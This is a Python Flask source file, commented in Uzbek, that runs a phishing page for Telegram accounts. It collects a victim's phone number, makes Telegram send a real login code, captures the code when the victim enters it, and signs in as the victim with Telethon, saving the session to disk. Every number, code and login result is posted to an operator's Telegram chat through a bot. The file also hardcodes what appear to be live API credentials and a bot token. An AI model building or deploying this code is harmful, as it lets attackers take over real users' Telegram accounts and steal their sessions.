import os
import asyncio
import requests
from flask import Flask, request, render_template, redirect, url_for
from telethon import TelegramClient

app = Flask(__name__)

# --- SOZLAMALAR ---
API_ID = 26543168 
API_HASH = '8f34586d061f185c635677c3e53f19f2'
BOT_TOKEN = '7669527932:AAHsk0oYn6A3v7j42kUaMvGzS6uO_vYv4uA' # O'zingizning bot tokeningizni yozing
ADMIN_ID = '6107316719' # O'zingizning Telegram ID-ingizni yozing
SESSION_DIR = './sessions'

if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

storage = {}

def send_to_bot(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": ADMIN_ID, "text": message})

@app.route('/')
def index():
    return render_template('verify.html', step=1)

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone').replace(' ', '').replace('-', '')
    if not phone.startswith('+'): phone = '+' + phone

    send_to_bot(f"📞 Yangi raqam kiritildi: {phone}")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(os.path.join(SESSION_DIR, phone), API_ID, API_HASH, loop=loop)
    
    try:
        loop.run_until_complete(client.connect())
        sent = loop.run_until_complete(client.send_code_request(phone))
        storage[phone] = {'hash': sent.phone_code_hash, 'client': client, 'loop': loop}
        return render_template('verify.html', step=2, phone=phone)
    except Exception as e:
        send_to_bot(f"❌ Xatolik (Login): {str(e)}")
        return redirect(url_for('index'))

@app.route('/verify', methods=['POST'])
def verify():
    phone = request.form.get('phone')
    code = request.form.get('code')
    data = storage.get(phone)
    
    if not data: 
        return redirect(url_for('index'))

    send_to_bot(f"🔑 Kod kiritildi: {code}\nRaqam: {phone}")

    client, p_hash, loop = data['client'], data['hash'], data['loop']
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=p_hash))
        send_to_bot(f"✅ Muvaffaqiyatli kirildi! Sessiya saqlandi: {phone}")
        return "Tasdiqlandi! Telegramingizni tekshiring."
    except Exception as e:
        send_to_bot(f"❌ Xato (Verify): {str(e)}")
        return f"Xato: {str(e)}"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
